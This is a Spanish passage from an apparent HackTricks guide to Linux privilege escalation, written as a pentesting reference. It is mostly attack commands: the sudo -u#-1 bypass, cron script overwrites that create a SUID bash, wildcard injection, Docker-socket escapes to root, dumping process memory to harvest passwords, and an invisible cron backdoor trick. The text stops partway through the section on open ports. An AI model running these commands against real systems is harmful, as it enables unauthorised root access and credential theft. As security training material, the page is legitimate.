# Escalación de Privilegios en Linux

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información del Sistema

### Información del SO

Comencemos obteniendo conocimiento del sistema operativo en ejecución.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ruta

Si **tienes permisos de escritura en cualquier carpeta dentro de la variable `PATH`**, es posible que puedas secuestrar algunas bibliotecas o binarios:
```bash
echo $PATH
```
### Información del entorno

¿Información interesante, contraseñas o claves API en las variables de entorno?
```bash
(env || set) 2>/dev/null
```
### Exploits del Kernel

Verifique la versión del kernel y si existe algún exploit que se pueda utilizar para escalar privilegios
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puedes encontrar una buena lista de kernels vulnerables y algunos **exploits ya compilados** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Otros sitios donde puedes encontrar algunos **exploits compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones de kernel vulnerables de esa web, puedes hacer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Las herramientas que podrían ayudar a buscar exploits del kernel son:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ejecutar EN la víctima, solo verifica exploits para kernel 2.x)

Siempre **busca la versión del kernel en Google**, tal vez tu versión del kernel esté mencionada en algún exploit del kernel y así te asegurarás de que este exploit es válido.

### CVE-2016-5195 (DirtyCow)

Escalada de privilegios en Linux - Kernel de Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versión de Sudo

Basado en las versiones vulnerables de sudo que aparecen en:
```bash
searchsploit sudo
```
Puedes verificar si la versión de sudo es vulnerable utilizando este comando grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Por @sickrov
```
sudo -u#-1 /bin/bash
```
### Fallo de verificación de firma de Dmesg

Verifica **smasher2 box de HTB** para ver un **ejemplo** de cómo esta vulnerabilidad podría ser explotada
```bash
dmesg 2>/dev/null | grep "signature"
```
### Más enumeración del sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar posibles defensas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity es un conjunto de parches para el kernel de Linux que incluye características de seguridad avanzadas, como protección contra escalada de privilegios y prevención de ejecución de código arbitrario.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield es una característica de seguridad del kernel de Linux que ayuda a prevenir ataques de desbordamiento de búfer y ejecución de código arbitrario al proteger la pila, la memoria y las direcciones de retorno de las funciones. Esta característica se implementa desactivando la ejecución de código en áreas de memoria específicas que no deberían contener código ejecutable, lo que dificulta a los atacantes explotar vulnerabilidades en el sistema.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

**SELinux** (Security-Enhanced Linux) es un mecanismo de control de acceso obligatorio (MAC) implementado en el núcleo del sistema Linux. Ayuda a reforzar las políticas de seguridad del sistema, restringiendo los privilegios de los usuarios y los programas para reducir el impacto de posibles vulnerabilidades.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Escapar de Docker

Si estás dentro de un contenedor de Docker, puedes intentar escapar de él:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Discos

Verifica **qué está montado y desmontado**, dónde y por qué. Si algo está desmontado, podrías intentar montarlo y buscar información privada.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binarios útiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
También, verifica si **hay algún compilador instalado**. Esto es útil si necesitas usar alguna vulnerabilidad del kernel, ya que se recomienda compilarla en la máquina donde la vas a utilizar (o en una similar)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerable Instalado

Verifique la **versión de los paquetes y servicios instalados**. Tal vez haya alguna versión antigua de Nagios (por ejemplo) que podría ser explotada para escalar privilegios...\
Se recomienda verificar manualmente la versión del software instalado más sospechoso.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si tienes acceso SSH a la máquina, también podrías usar **openVAS** para verificar si hay software desactualizado y vulnerable instalado en la máquina.

{% hint style="info" %}
_Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil, por lo tanto, se recomienda utilizar algunas aplicaciones como OpenVAS o similares que verificarán si alguna versión de software instalada es vulnerable a exploits conocidos_
{% endhint %}

## Procesos

Echa un vistazo a **qué procesos** se están ejecutando y verifica si algún proceso tiene **más privilegios de los que debería** (¿quizás un tomcat ejecutado por root?)
```bash
ps aux
ps -ef
top -n 1
```
Siempre verifica si hay posibles **depuradores de electron/cef/chromium** en ejecución, podrías abusar de ellos para escalar privilegios. **Linpeas** los detecta revisando el parámetro `--inspect` dentro de la línea de comandos del proceso.\
También **verifica tus privilegios sobre los binarios de los procesos**, tal vez puedas sobrescribir a alguien.

### Monitoreo de procesos

Puedes utilizar herramientas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorear procesos. Esto puede ser muy útil para identificar procesos vulnerables que se ejecutan con frecuencia o cuando se cumplen un conjunto de requisitos.

### Memoria de procesos

Algunos servicios de un servidor guardan **credenciales en texto claro dentro de la memoria**.\
Normalmente necesitarás **privilegios de root** para leer la memoria de procesos que pertenecen a otros usuarios, por lo tanto, esto suele ser más útil cuando ya eres root y deseas descubrir más credenciales.\
Sin embargo, recuerda que **como usuario regular puedes leer la memoria de los procesos que posees**.

{% hint style="warning" %}
Ten en cuenta que hoy en día la mayoría de las máquinas **no permiten ptrace de forma predeterminada**, lo que significa que no puedes volcar otros procesos que pertenecen a tu usuario no privilegiado.

El archivo _**/proc/sys/kernel/yama/ptrace\_scope**_ controla la accesibilidad de ptrace:

* **kernel.yama.ptrace\_scope = 0**: todos los procesos pueden ser depurados, siempre y cuando tengan el mismo uid. Esta es la forma clásica en la que funcionaba ptrace.
* **kernel.yama.ptrace\_scope = 1**: solo un proceso padre puede ser depurado.
* **kernel.yama.ptrace\_scope = 2**: Solo un administrador puede usar ptrace, ya que requiere la capacidad CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Ningún proceso puede ser rastreado con ptrace. Una vez establecido, se necesita un reinicio para habilitar el rastreo nuevamente.
{% endhint %}

#### GDB

Si tienes acceso a la memoria de un servicio FTP (por ejemplo), podrías obtener el Heap y buscar dentro de él sus credenciales.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script de GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso dado, **maps muestra cómo está mapeada la memoria dentro del espacio de direcciones virtuales de ese proceso**; también muestra los **permisos de cada región mapeada**. El archivo pseudo **mem expone la memoria del proceso en sí**. A partir del archivo **maps sabemos qué regiones de memoria son legibles** y sus desplazamientos. Utilizamos esta información para **buscar en el archivo mem y volcar todas las regiones legibles** en un archivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` proporciona acceso a la memoria **física** del sistema, no a la memoria virtual. El espacio de direcciones virtuales del kernel se puede acceder utilizando /dev/kmem.\
Normalmente, `/dev/mem` solo es legible por el usuario **root** y el grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para Linux

ProcDump es una reimaginación para Linux de la clásica herramienta ProcDump de la suite de herramientas Sysinternals para Windows. Encuéntralo en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Herramientas

Para volcar la memoria de un proceso, podrías usar:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso propiedad tuya
* Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credenciales de la Memoria del Proceso

#### Ejemplo Manual

Si descubres que el proceso del autenticador está en ejecución:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puedes volcar el proceso (ver secciones anteriores para encontrar diferentes formas de volcar la memoria de un proceso) y buscar credenciales dentro de la memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **robará credenciales en texto claro de la memoria** y de algunos **archivos conocidos**. Requiere privilegios de root para funcionar correctamente.

| Característica                                      | Nombre del Proceso    |
| --------------------------------------------------- | ---------------------- |
| Contraseña de GDM (Kali Desktop, Debian Desktop)    | gdm-password          |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)   | gnome-keyring-daemon  |
| LightDM (Ubuntu Desktop)                            | lightdm               |
| VSFTPd (Conexiones FTP activas)                     | vsftpd                |
| Apache2 (Sesiones activas de autenticación básica HTTP) | apache2             |
| OpenSSH (Sesiones SSH activas - Uso de Sudo)         | sshd:                 |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tareas programadas/Cron jobs

Verifique si alguna tarea programada es vulnerable. Tal vez pueda aprovechar un script que se ejecuta como root (¿vulnerabilidad de comodín? ¿puede modificar archivos que root utiliza? ¿utilizar enlaces simbólicos? ¿crear archivos específicos en el directorio que root utiliza?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ruta de Cron

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar la RUTA: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota cómo el usuario "user" tiene privilegios de escritura sobre /home/user_)

Si dentro de esta crontab el usuario root intenta ejecutar algún comando o script sin establecer la ruta. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener un shell de root utilizando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando un script con un comodín (Inyección de Comodín)

Si un script es ejecutado por root y tiene un "**\***" dentro de un comando, podrías explotar esto para hacer cosas inesperadas (como escalada de privilegios). Ejemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si el comodín está precedido de una ruta como** _**/some/path/\***_ **, no es vulnerable (incluso** _**./\***_ **no lo es).**

Lee la siguiente página para conocer más trucos de explotación de comodines:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Sobrescribir script de Cron y symlink

Si **puedes modificar un script de Cron** ejecutado por root, puedes obtener una shell muy fácilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si el script ejecutado por root utiliza un **directorio al que tienes acceso total**, tal vez podría ser útil eliminar esa carpeta y **crear un enlace simbólico a otra** que sirva a un script controlado por ti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Tareas cron frecuentes

Puedes monitorear los procesos para buscar aquellos que se están ejecutando cada 1, 2 o 5 minutos. Tal vez puedas aprovecharlo para escalar privilegios.

Por ejemplo, para **monitorear cada 0.1s durante 1 minuto**, **ordenar por comandos menos ejecutados** y eliminar los comandos que se han ejecutado más veces, puedes hacer lo siguiente:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (esto monitoreará y listará cada proceso que se inicia).

### Trabajos cron invisibles

Es posible crear un trabajo cron **poniendo un retorno de carro después de un comentario** (sin carácter de nueva línea), y el trabajo cron funcionará. Ejemplo (nota el carácter de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servicios

### Archivos _.service_ con permisos de escritura

Verifique si puede escribir en algún archivo `.service`, si puede, **podría modificarlo** para que **ejecute** su **puerta trasera cuando** el servicio se **inicie**, **reinicie** o **detenga** (quizás necesite esperar hasta que la máquina se reinicie).\
Por ejemplo, cree su puerta trasera dentro del archivo .service con **`ExecStart=/tmp/script.sh`**

### Binarios de servicios con permisos de escritura

Tenga en cuenta que si tiene **permisos de escritura sobre los binarios que son ejecutados por los servicios**, puede cambiarlos por puertas traseras para que cuando los servicios se vuelvan a ejecutar, las puertas traseras se ejecuten.

### Rutas relativas de systemd PATH

Puede ver el PATH utilizado por **systemd** con:
```bash
systemctl show-environment
```
Si descubres que puedes **escribir** en cualquiera de las carpetas de la ruta, es posible que puedas **escalar privilegios**. Debes buscar **rutas relativas que se utilicen en archivos de configuración de servicios** como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Luego, crea un **ejecutable** con el **mismo nombre que el binario de la ruta relativa** dentro de la carpeta PATH de systemd donde puedas escribir, y cuando se solicite al servicio ejecutar la acción vulnerable (**Start**, **Stop**, **Reload**), se ejecutará tu **puerta trasera** (los usuarios sin privilegios generalmente no pueden iniciar/detener servicios, pero verifica si puedes usar `sudo -l`).

**Aprende más sobre los servicios con `man systemd.service`.**

## **Temporizadores**

Los **temporizadores** son archivos de unidad de systemd cuyo nombre termina en `**.timer**` que controlan archivos o eventos `**.service**`. Los **temporizadores** pueden usarse como una alternativa a cron ya que tienen soporte incorporado para eventos de tiempo de calendario y eventos de tiempo monótono y pueden ejecutarse de forma asíncrona.

Puedes enumerar todos los temporizadores con:
```bash
systemctl list-timers --all
```
### Temporizadores modificables

Si puedes modificar un temporizador, puedes hacer que ejecute algunas existencias de systemd.unit (como un `.service` o un `.target`)
```bash
Unit=backdoor.service
```
En la documentación se puede leer qué es la Unidad:

> La unidad a activar cuando este temporizador se agota. El argumento es un nombre de unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor se establece de forma predeterminada en un servicio que tiene el mismo nombre que la unidad de temporizador, excepto por el sufijo. (Ver arriba.) Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del temporizador sean idénticos, excepto por el sufijo.

Por lo tanto, para abusar de este permiso necesitarías:

* Encontrar alguna unidad de systemd (como un `.service`) que esté **ejecutando un binario escribible**
* Encontrar alguna unidad de systemd que esté **ejecutando una ruta relativa** y tener **privilegios de escritura** sobre la **RUTA de systemd** (para hacerse pasar por ese ejecutable)

**Aprende más sobre temporizadores con `man systemd.timer`.**

### **Habilitar Temporizador**

Para habilitar un temporizador necesitas privilegios de root y ejecutar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Ten en cuenta que el **temporizador** se **activa** creando un enlace simbólico en `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Los Sockets de Dominio Unix (UDS) permiten la **comunicación entre procesos** en la misma o diferentes máquinas dentro de modelos cliente-servidor. Utilizan archivos de descriptor Unix estándar para la comunicación entre computadoras y se configuran a través de archivos `.socket`.

Los sockets se pueden configurar utilizando archivos `.socket`.

**Aprende más sobre los sockets con `man systemd.socket`.** Dentro de este archivo, se pueden configurar varios parámetros interesantes:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son diferentes pero se utiliza un resumen para **indicar dónde va a escuchar** el socket (la ruta del archivo de socket AF\_UNIX, el número de puerto IPv4/6, etc.)
* `Accept`: Toma un argumento booleano. Si es **verdadero**, se genera una **instancia de servicio para cada conexión entrante** y solo se pasa el socket de conexión a ella. Si es **falso**, todos los sockets de escucha se **pasan a la unidad de servicio iniciada**, y solo se genera una unidad de servicio para todas las conexiones. Este valor se ignora para los sockets de datagramas y FIFOs donde una única unidad de servicio maneja incondicionalmente todo el tráfico entrante. **Por defecto es falso**. Por razones de rendimiento, se recomienda escribir nuevos demonios solo de una manera adecuada para `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Toma una o más líneas de comando, que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha se **crean** y se enlazan, respectivamente. El primer token de la línea de comando debe ser un nombre de archivo absoluto, seguido de argumentos para el proceso.
* `ExecStopPre`, `ExecStopPost`: Comandos adicionales que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha se **cierran** y se eliminan, respectivamente.
* `Service`: Especifica el nombre de la **unidad de servicio** **para activar** en el **tráfico entrante**. Esta configuración solo se permite para sockets con Accept=no. Por defecto, es el servicio que lleva el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos, no debería ser necesario usar esta opción.

### Archivos .socket modificables

Si encuentras un archivo `.socket` **modificable**, puedes **agregar** al principio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y la puerta trasera se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente necesitarás esperar hasta que la máquina se reinicie.**\
_Nota que el sistema debe estar utilizando esa configuración de archivo de socket o la puerta trasera no se ejecutará_

### Sockets modificables

Si **identificas algún socket modificable** (_ahora estamos hablando de Sockets Unix y no de los archivos de configuración `.socket`_), entonces **puedes comunicarte** con ese socket y tal vez explotar una vulnerabilidad.

### Enumerar Sockets Unix
```bash
netstat -a -p --unix
```
### Conexión directa
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ejemplo de explotación:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Sockets HTTP

Tenga en cuenta que puede haber algunos **sockets escuchando peticiones HTTP** (_No estoy hablando de archivos .socket sino de archivos que actúan como sockets Unix_). Puede verificar esto con:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Si el socket **responde con una solicitud HTTP**, entonces puedes **comunicarte** con él y tal vez **explotar alguna vulnerabilidad**.

### Socket de Docker Escribible

El socket de Docker, que se encuentra comúnmente en `/var/run/docker.sock`, es un archivo crítico que debe estar asegurado. Por defecto, es escribible por el usuario `root` y los miembros del grupo `docker`. Poseer acceso de escritura a este socket puede llevar a una escalada de privilegios. Aquí tienes un desglose de cómo se puede hacer esto y métodos alternativos si la CLI de Docker no está disponible.

#### **Escalada de Privilegios con la CLI de Docker**

Si tienes acceso de escritura al socket de Docker, puedes escalar privilegios usando los siguientes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Estos comandos te permiten ejecutar un contenedor con acceso de nivel raíz al sistema de archivos del host.

#### **Usando la API de Docker Directamente**

En casos donde la CLI de Docker no está disponible, el socket de Docker aún puede ser manipulado usando la API de Docker y comandos `curl`.

1.  **Listar Imágenes de Docker:** Obtener la lista de imágenes disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Crear un Contenedor:** Enviar una solicitud para crear un contenedor que monta el directorio raíz del sistema host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Iniciar el contenedor recién creado:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **Adjuntarse al Contenedor:** Usar `socat` para establecer una conexión al contenedor, permitiendo la ejecución de comandos dentro de él.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Después de configurar la conexión `socat`, puedes ejecutar comandos directamente en el contenedor con acceso de nivel raíz al sistema de archivos del host.

### Otros

Ten en cuenta que si tienes permisos de escritura sobre el socket de docker porque estás **dentro del grupo `docker`** tienes [**más formas de escalar privilegios**](interesting-groups-linux-pe/#docker-group). Si el [**API de docker está escuchando en un puerto** también puedes comprometerlo](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **más formas de escapar de docker o abusar de él para escalar privilegios** en:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Escalada de privilegios de Containerd (ctr)

Si descubres que puedes usar el comando **`ctr`**, lee la siguiente página ya que **podrías abusar de él para escalar privilegios**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Escalada de privilegios de **RunC**

Si descubres que puedes usar el comando **`runc`**, lee la siguiente página ya que **podrías abusar de él para escalar privilegios**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus es un sofisticado **sistema de Comunicación entre Procesos (IPC)** que permite a las aplicaciones interactuar y compartir datos de manera eficiente. Diseñado pensando en el sistema Linux moderno, ofrece un marco robusto para diferentes formas de comunicación de aplicaciones.

El sistema es versátil, soportando IPC básico que mejora el intercambio de datos entre procesos, recordando a **sockets de dominio UNIX mejorados**. Además, ayuda en la difusión de eventos o señales, fomentando la integración fluida entre los componentes del sistema. Por ejemplo, una señal de un demonio de Bluetooth sobre una llamada entrante puede hacer que un reproductor de música se silencie, mejorando la experiencia del usuario. Además, D-Bus soporta un sistema de objetos remotos, simplificando las solicitudes de servicio e invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.

D-Bus opera en un modelo de **permitir/denegar**, gestionando permisos de mensajes (llamadas de métodos, emisiones de señales, etc.) basados en el efecto acumulativo de reglas de política coincidentes. Estas políticas especifican interacciones con el bus, permitiendo potencialmente la escalada de privilegios a través de la explotación de estos permisos.

Se proporciona un ejemplo de tal política en `/etc/dbus-1/system.d/wpa_supplicant.conf`, detallando permisos para que el usuario root posea, envíe y reciba mensajes de `fi.w1.wpa_supplicant1`.

Las políticas sin un usuario o grupo especificado se aplican universalmente, mientras que las políticas de contexto "default" se aplican a todos los no cubiertos por otras políticas específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprende cómo enumerar y explotar una comunicación D-Bus aquí:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Red**

Siempre es interesante enumerar la red y averiguar la posición de la máquina.

### Enumeración genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Puertos abiertos

Siempre verifica los servicios de red que se están ejecutando en la máquina con la que no pudiste interactuar antes de acceder a ella:
```bash
(netstat -punta || ss --ntpu)
